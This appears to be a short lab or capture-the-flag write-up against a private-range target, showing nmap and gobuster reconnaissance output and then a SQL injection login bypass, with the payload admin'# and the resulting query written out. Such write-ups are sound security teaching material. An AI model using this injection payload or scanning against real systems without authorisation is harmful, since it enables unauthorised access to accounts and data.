----
### Initial IPs

Attacker = 10.10.14.136
Victim = 10.129.213.192

----

### Initial Scan 

- did the nmap scan  found that it is running Apache 2.4.38 on a Debian based system
```shell
nmap -sV 10.129.213.192
Starting Nmap 7.93 
Nmap scan report for 10.129.213.192
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

```
- Given that it is running a webserver I decided to open the IP in the browser, found that there is a login page
![[Pasted image 20230323180934.png]]
- Based on experience I decided to use gobuster to see if there are any other directories, found the folders attached to the webserver
```shell
[+] Url:                     http://10.129.213.192
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/23 14:14:53 Starting gobuster in directory enumeration mode
===============================================================

/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/css                  (Status: 301) [Size: 314] [--> http://10.129.213.192/css/]                                                                          
/fonts                (Status: 301) [Size: 316] [--> http://10.129.213.192/fonts/]                                                                        
/images               (Status: 301) [Size: 317] [--> http://10.129.213.192/images/]                                                                       
/index.php            (Status: 200) [Size: 4896]
/js                   (Status: 301) [Size: 313] [--> http://10.129.213.192/js/]                                                                           
/server-status        (Status: 403) [Size: 279]
/vendor               (Status: 301) [Size: 317] [--> http://10.129.213.192/vendor/]  
```
- Didnt find anything particually of interest so tried to login to the form using default this tdidnt work
- So tried SQL injecttion, as we don't know the password we need to comment that out. Using # will comment that out when we put into the username field and make sure to fill the password field to bypass the client side filtering.
- the query will look like the following, the # will drop the AND and get the full record
```sql
SELECT * from users where username='admin'#' AND password='a'
```